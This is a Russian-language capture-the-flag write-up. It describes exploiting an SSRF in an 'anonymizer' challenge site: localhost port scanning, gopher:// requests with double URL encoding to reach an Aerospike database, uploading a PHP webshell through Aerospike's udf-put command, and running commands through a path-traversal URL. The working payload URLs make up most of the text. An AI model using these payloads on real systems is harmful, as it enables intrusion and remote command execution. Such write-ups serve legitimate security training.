Видим тот же самый сайт, все прекрасно, можно сканировать открытые порты на localhost, отправляем этот запрос в Intruder или пишем сами скрипт(лучше самому написать, так как открытый порт будем определять по таймингу респонса) и ставим пейлодом порт от 1 до 5000(можно хоть 65000, но там ничего нет). Нвходим открытый порты 3000,3001,3003, идем гуглить какой продукт изпользует эти порты(находим кстати не на первой же странице, надо немного постараться) узнаем, что это aerospike db (http://www.aerospike.com/). Читаем доки и узнаем что порт 3003 - телнет сервис, а 3000 - основной. пробуем обратиться к телнету
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:3003/_namespaces%0a%0d/&page=curl&submit=+GO%21+
{% endhighlight %}
Понимаем. что символы перевода строки блочатся, обходим это при помощи double encode
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:3003/_namespaces%250a%250d/&page=curl&submit=+GO%21+
{% endhighlight %}
Появляется новая проблема, телнет не сбрасывает соединение, чтобы мы смогли увидеть результат команды, придется образать к основному сервису, для этого надо понять как он работает, скачиваем aerospike db скачиваем aerospike command line tools. Включаем wireshark и обращаемся из cli к aerospike.
{% highlight ruby %}
02 01 00 00 00 00 00 0f namespace/test 0a
{% endhighlight %}
Поcчитав количество символов предпологаем, что 0хf - это длина пейлоада запроса, отправляем запрос, не забыв про double encode
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=gopher://127.0.0.1:3000/_%2502%2501%2500%2500%2500%2500%2500%250fnamespace/test%250a&page=curl
{% endhighlight %}
И получаем ответ
{% highlight ruby %}
objects=1;sub_objects=0;tombstones=0;master_objects=1;master_sub_objects=0;master_tombstones=0;prole_objects=0;prole_sub_objects=0;prole_tombstones=0;stop_writes=false;hwm_breached=false;
{% endhighlight %}
Пишем скрипт, который сразу кодирует комманды и отправляет из на сервер через gopher, эдакий SSRF shell для aerospike-a. 
Смотрим что есть в базе, база оказывается пуста, что же делать, идем читать документацию aerospike узнаем что в нем есть возможность запускать LUA скрипты, а еще эти же скрипты можно загрузить на сервер при помощи команды udf-put, и так готовим наш вебшелл и пытаемся отправить запрос надеясь, что aerospike-у будет пофиг на экстеншн
{% highlight ruby %}
udf-put:filename=webshell.php;udf-type=LUA;content-len=XX;content=BASE64BASE64BASE64BASE64;
{% endhighlight %}
Смотрим в доках что lua скрипты загружаются в /opt/aerospike/usr/udf/lua/, осталось просто обратиться к нашему вебшеллу через
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?page=../../../../../../../opt/aerospike/usr/udf/lua/webshell&cmd=ls
{% endhighlight %}

## PWND!

## flag:<font color="red">42e45d5490831c5141617521e74cb536</font>

